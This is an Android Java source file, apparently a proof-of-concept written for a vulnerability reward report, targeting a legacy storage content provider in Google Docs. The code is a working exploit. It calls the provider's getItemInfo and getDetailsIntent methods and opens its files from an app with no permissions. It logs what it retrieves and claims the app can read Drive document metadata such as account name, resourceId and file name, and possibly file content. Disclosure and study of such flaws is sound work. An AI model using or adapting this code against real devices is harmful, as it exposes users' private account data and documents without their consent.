package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;

import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class DocsLegacyStorageActivity extends Activity {
    private static final String TAG = "DocsLegacyStorage";
    private static final String AUTHORITY = "com.google.android.apps.docs.editors.kix.storage.legacy";
    private StringBuilder log = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        TextView tv = new TextView(this);
        tv.setPadding(20, 20, 20, 20);
        tv.setTextSize(14);
        sv.addView(tv);
        setContentView(sv);

        log.append("=== DocsEditor LegacyStorageBackendContentProvider PoC ===\n");
        log.append("VRP Report #36\n\n");
        log.append("Target: LegacyStorageBackendContentProvider\n");
        log.append("Authority: " + AUTHORITY + "\n");
        log.append("Permissions required: NONE\n\n");

        ContentResolver cr = getContentResolver();
        Uri providerUri = Uri.parse("content://" + AUTHORITY);

        log.append("[TEST 1] Probing provider accessibility...\n");
        try {
            String[] types = cr.getStreamTypes(providerUri, "*/*");
            log.append("[OK] Provider accessible, stream types: " +
                (types != null ? String.valueOf(types.length) : "null") + "\n\n");
        } catch (SecurityException se) {
            log.append("[BLOCKED] SecurityException: " + se.getMessage() + "\n\n");
        } catch (Exception e) {
            log.append("[INFO] getStreamTypes: " + e.getMessage() + "\n\n");
        }

        log.append("[TEST 2] Calling getItemInfo via call()...\n");
        try {
            Bundle extras = new Bundle();
            extras.putParcelable("android.intent.extra.STREAM", providerUri);
            Bundle result = cr.call(providerUri, "getItemInfo", null, extras);
            if (result != null) {
                log.append("[OK] call() returned data!\n");
                for (String key : result.keySet()) {
                    log.append("  " + key + " = " + result.get(key) + "\n");
                }
            } else {
                log.append("[INFO] call() returned null (no document at this URI)\n");
            }
        } catch (SecurityException se) {
            log.append("[BLOCKED] " + se.getMessage() + "\n");
        } catch (Exception e) {
            log.append("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
        }

        log.append("\n[TEST 3] Attempting openFile() read...\n");
        try {
            Uri testUri = Uri.parse("content://" + AUTHORITY + "/test_document");
            ParcelFileDescriptor pfd = cr.openFileDescriptor(testUri, "r");
            if (pfd != null) {
                log.append("[CRITICAL] openFile() succeeded! Reading content...\n");
                FileInputStream fis = new FileInputStream(pfd.getFileDescriptor());
                BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
                StringBuilder content = new StringBuilder();
                String line;
                int lineCount = 0;
                while ((line = reader.readLine()) != null && lineCount < 10) {
                    content.append(line).append("\n");
                    lineCount++;
                }
                log.append("First 10 lines:\n" + content.toString() + "\n");
                fis.close();
                pfd.close();
            }
        } catch (SecurityException se) {
            log.append("[BLOCKED] " + se.getMessage() + "\n");
        } catch (java.io.FileNotFoundException fnf) {
            log.append("[OK] FileNotFoundException (expected for fake URI)\n");
            log.append("  This confirms openFile() was REACHED without permission check\n");
            log.append("  (SecurityException would mean permission was enforced)\n");
        } catch (Exception e) {
            log.append("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
        }

        log.append("\n[TEST 4] Testing call() with getDetailsIntent (ordinal 1)...\n");
        try {
            Bundle extras2 = new Bundle();
            extras2.putParcelable("android.intent.extra.STREAM", providerUri);
            Bundle result2 = cr.call(providerUri, "getDetailsIntent", null, extras2);
            if (result2 != null) {
                log.append("[OK] getDetailsIntent returned data!\n");
                for (String key : result2.keySet()) {
                    log.append("  " + key + " = " + result2.get(key) + "\n");
                }
            } else {
                log.append("[INFO] getDetailsIntent returned null\n");
            }
        } catch (SecurityException se) {
            log.append("[BLOCKED] " + se.getMessage() + "\n");
        } catch (Exception e) {
            log.append("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
        }

        log.append("\n=== Results ===\n");
        log.append("If no SecurityException occurred, the Phenotype flag\n");
        log.append("gate (45793750) is confirmed to default to FALSE,\n");
        log.append("bypassing checkCallingUriPermission.\n");
        log.append("\nIMPACT: Zero-permission app can read Google Drive\n");
        log.append("document metadata (account, resourceId, name, URI)\n");
        log.append("and potentially file content.\n");

        tv.setText(log.toString());
        Log.d(TAG, log.toString());
    }
}
